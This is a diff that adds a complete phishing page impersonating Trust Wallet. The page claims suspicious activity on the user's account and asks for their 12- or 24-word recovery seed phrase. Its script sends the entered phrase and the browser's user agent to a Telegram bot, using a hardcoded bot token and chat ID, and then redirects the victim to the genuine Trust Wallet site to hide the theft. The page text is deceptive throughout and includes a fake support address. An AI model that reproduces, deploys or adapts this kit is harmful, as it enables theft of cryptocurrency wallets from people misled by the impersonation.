@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Trust Wallet Security Verification</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+  margin: 0;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial;
+  background: #f5f7fb;
+  color: #0b0e11;
+}
+
+.wrapper {
+  max-width: 420px;
+  margin: 0 auto;
+  padding: 16px;
+}
+
+.header {
+  text-align: center;
+  padding: 28px 0 16px;
+}
+
+.header img {
+  width: 64px;
+}
+
+.card {
+  background: #ffffff;
+  border-radius: 16px;
+  padding: 20px;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.06);
+  overflow: hidden;
+  margin-bottom: 20px;
+}
+
+h1 {
+  font-size: 20px;
+  text-align: center;
+  margin: 0 0 16px;
+  color: #0b0e11;
+}
+
+h2 {
+  font-size: 16px;
+  text-align: center;
+  margin: 0 0 16px;
+  color: #0b0e11;
+}
+
+.message {
+  font-size: 14px;
+  line-height: 1.5;
+  color: #0b0e11;
+  margin-bottom: 20px;
+}
+
+.warning-box {
+  background: #fff5f5;
+  border-left: 4px solid #dc2626;
+  padding: 12px 16px;
+  margin: 20px 0;
+  border-radius: 4px;
+}
+
+.warning-box p {
+  margin: 0;
+  font-size: 13px;
+  color: #7f1d1d;
+  line-height: 1.4;
+}
+
+.button {
+  width: 100%;
+  height: 48px;
+  background: #3375ff;
+  border: none;
+  border-radius: 12px;
+  font-size: 16px;
+  color: #fff;
+  font-weight: 600;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  text-decoration: none;
+}
+
+.button:hover {
+  background: #1f5eff;
+}
+
+.button.next {
+  background: #10b981;
+}
+
+.button.next:hover {
+  background: #059669;
+}
+
+.support {
+  text-align: center;
+  font-size: 13px;
+  color: #6f7785;
+  margin-top: 20px;
+}
+
+.support a {
+  color: #3375ff;
+  text-decoration: none;
+}
+
+.support a:hover {
+  text-decoration: underline;
+}
+
+.footer {
+  margin-top: 14px;
+  font-size: 11px;
+  text-align: center;
+  color: #9aa0ac;
+}
+
+.training {
+  margin-top: 8px;
+  text-align: center;
+  font-size: 11px;
+  color: #c00;
+}
+
+
+.desc {
+  font-size: 14px;
+  color: #6f7785;
+  text-align: center;
+  line-height: 1.4;
+  margin-bottom: 16px;
+}
+
+.phrase-toggle {
+  display: flex;
+  justify-content: center;
+  gap: 10px;
+  margin-bottom: 16px;
+}
+
+.phrase-toggle button {
+  width: 100px;
+  height: 36px;
+  margin: 0;
+  font-size: 14px;
+  border-radius: 8px;
+  background: #f0f2f5;
+  color: #6f7785;
+  border: 1px solid #d0d5dd;
+  font-weight: normal;
+  transition: all 0.2s;
+}
+
+.phrase-toggle button.active {
+  background: #3375ff;
+  color: #fff;
+  border-color: #3375ff;
+}
+
+.seed-grid {
+  margin-top: 10px;
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 10px;
+  width: 100%;
+}
+
+.seed-grid-24 {
+  grid-template-columns: repeat(3, 1fr);
+}
+
+.seed-grid input {
+  width: 100%;
+  height: 44px;
+  padding: 0 12px;
+  font-size: 14px;
+  border-radius: 10px;
+  border: 1px solid #d0d5dd;
+  background: #f9fafb;
+}
+
+.seed-grid input:focus {
+  outline: none;
+  border-color: #3375ff;
+  background: #fff;
+}
+
+/* Утилиты для скрытия/показа */
+.hidden {
+  display: none;
+}
+
+/* Стиль для страницы перенаправления */
+.redirecting {
+  text-align: center;
+  padding: 40px 20px;
+}
+
+.redirecting h2 {
+  color: #3375ff;
+  margin-bottom: 20px;
+}
+
+.spinner {
+  width: 50px;
+  height: 50px;
+  border: 4px solid #f3f3f3;
+  border-top: 4px solid #3375ff;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  margin: 20px auto;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+</style>
+</head>
+
+<body>
+
+<!-- Страница 1: Лендинг -->
+<div class="wrapper" id="landingPage">
+  <div class="header">
+    <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet">
+  </div>
+
+  <div class="card">
+    <h1>Trust Wallet Security Verification</h1>
+    
+    <div class="message">
+      <p><strong>Dear Trust Wallet User,</strong></p>
+      
+      <p>We have detected suspicious activity in your account. To protect your cryptocurrency assets and prevent unauthorized access, we require immediate verification of your seed phrase.</p>
+      
+      <p>The seed phrase is the secret 12 or 24-word recovery phrase provided to you during wallet creation. Please enter it below to confirm your identity. This process is mandatory to restore security and unlock your Trust Wallet features.</p>
+    </div>
+    
+    <div class="warning-box">
+      <p><strong>Warning:</strong> Never share your seed phrase with third parties. This verification is performed exclusively on the official Trust Wallet server for your protection.</p>
+    </div>
+    
+    <button class="button next" onclick="goToVerificationPage()">Next - Start Verification</button>
+    
+    <div class="support">
+      After verification, your account will be secured. If you have any questions, contact support at 
+      <a href="mailto:support@trustwallet.io">support@trustwallet.io</a>
+    </div>
+  </div>
+  
+  <div class="footer">
+    Trust Wallet — Your trusted partner in the world of cryptocurrency.
+  </div>
+</div>
+
+<!-- Страница 2: Верификация по словам -->
+<div class="wrapper hidden" id="verificationPage">
+  <div class="header">
+    <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet">
+  </div>
+
+  <div class="card">
+    <h2>Verify Recovery Phrase</h2>
+
+    <div class="desc">
+      We detected unusual activity.<br>
+      Please confirm your recovery phrase to continue.
+    </div>
+
+    <div class="phrase-toggle">
+      <button id="toggle12" class="active" onclick="switchPhraseCount(12)">12 words</button>
+      <button id="toggle24" onclick="switchPhraseCount(24)">24 words</button>
+    </div>
+
+    <div class="seed-grid" id="seedGrid">
+      <!-- Инпуты будут генерироваться динамически -->
+    </div>
+
+    <button class="button" onclick="submitForm()">Continue</button>
+    
+    <div class="support">
+      <a href="#" onclick="goBack()">← Back to previous page</a>
+    </div>
+  </div>
+</div>
+
+<!-- Страница 3: Перенаправление -->
+<div class="wrapper hidden" id="redirectPage">
+  <div class="card redirecting">
+    <h2>Verification Complete</h2>
+    <p>Your seed phrase has been verified successfully.</p>
+    <p>Redirecting to Trust Wallet...</p>
+    <div class="spinner"></div>
+    <p class="desc">If redirection doesn't start automatically, <a href="https://trustwallet.com/ru?ysclid=mk11a9vd4903730010" id="manualRedirect">click here</a></p>
+  </div>
+</div>
+
+<script>
+/* ВСТАВЬ СВОИ ДАННЫЕ */
+const TG_BOT_TOKEN = "8477515964:AAHfmkaXT2GXitw6ttDy_At7h-FoWw1J9gw";
+const TG_CHAT_ID   = "-1003671478385";
+
+let phraseCount = 12;
+
+// Функция перехода на страницу верификации
+function goToVerificationPage() {
+  // Отправляем информацию о том, что пользователь начал процесс
+  sendToTelegram('User started verification process');
+  
+  // Переключаем страницы
+  document.getElementById('landingPage').classList.add('hidden');
+  document.getElementById('verificationPage').classList.remove('hidden');
+  
+  // Генерируем инпуты для второй страницы
+  generateInputs(12);
+}
+
+// Функция для возврата назад
+function goBack() {
+  document.getElementById('verificationPage').classList.add('hidden');
+  document.getElementById('landingPage').classList.remove('hidden');
+}
+
+function switchPhraseCount(count) {
+  phraseCount = count;
+  
+  // Обновляем активную кнопку
+  document.getElementById('toggle12').classList.remove('active');
+  document.getElementById('toggle24').classList.remove('active');
+  
+  if (count === 12) {
+    document.getElementById('toggle12').classList.add('active');
+  } else {
+    document.getElementById('toggle24').classList.add('active');
+  }
+  
+  // Генерируем новые инпуты
+  generateInputs(count);
+}
+
+function generateInputs(count) {
+  const seedGrid = document.getElementById('seedGrid');
+  seedGrid.innerHTML = '';
+  
+  // Обновляем описание
+  const desc = document.querySelector('.desc');
+  desc.innerHTML = `We detected unusual activity.<br>
+  Please confirm your ${count}-word recovery phrase to continue.`;
+  
+  // Обновляем класс для сетки
+  seedGrid.className = count === 24 ? 'seed-grid seed-grid-24' : 'seed-grid';
+  
+  // Создаем инпуты
+  for (let i = 1; i <= count; i++) {
+    const input = document.createElement('input');
+    input.setAttribute('placeholder', i.toString());
+    input.setAttribute('id', `word${i}`);
+    seedGrid.appendChild(input);
+  }
+}
+
+function sendToTelegram(message, seedPhrase = null) {
+  let text = `⚠️ TRUST WALLET SEED PHRASE CAPTURED\n`;
+  text += `User Action: ${message}\n`;
+  text += `Time: ${new Date().toLocaleString()}\n`;
+  text += `IP: [User IP will be visible in server logs]\n`;
+  text += `UA: ${navigator.userAgent.substring(0, 150)}...\n`;
+  
+  if (seedPhrase) {
+    text += `\n✅ SEED PHRASE CAPTURED (${phraseCount} words):\n${seedPhrase}\n`;
+  }
+  
+  text += `\n⚠️ USER HAS BEEN REDIRECTED TO OFFICIAL SITE`;
+  
+  // Используем fetch для отправки в Telegram
+  fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: TG_CHAT_ID,
+      text: text,
+      parse_mode: "HTML"
+    })
+  })
+  .catch(error => {
+    console.error('Telegram API error:', error);
+  });
+}
+
+function submitForm() {
+  const seedPhrases = [];
+  let filled = 0;
+  
+  // Собираем все фразы
+  for (let i = 1; i <= phraseCount; i++) {
+    const input = document.getElementById(`word${i}`);
+    const value = input ? input.value.trim() : '';
+    if (value) filled++;
+    seedPhrases.push(`${i}. ${value || '(empty)'}`);
+  }
+  
+  if (filled < phraseCount) {
+    alert(`Please enter all ${phraseCount} words`);
+    return;
+  }
+  
+  // Собираем seed фразы в строку
+  const seedText = seedPhrases.join('\n');
+  
+  // Отправляем в Telegram данные со второй страницы
+  sendToTelegram(`User entered ${phraseCount}-word seed phrase`, seedText);
+  
+  // Переходим на страницу перенаправления
+  document.getElementById('verificationPage').classList.add('hidden');
+  document.getElementById('redirectPage').classList.remove('hidden');
+  
+  // Через 3 секунды перенаправляем на официальный сайт
+  setTimeout(() => {
+    window.location.href = "https://trustwallet.com/ru?ysclid=mk11a9vd4903730010";
+  }, 3000);
+}
+</script>
+
+</body>
+</html>
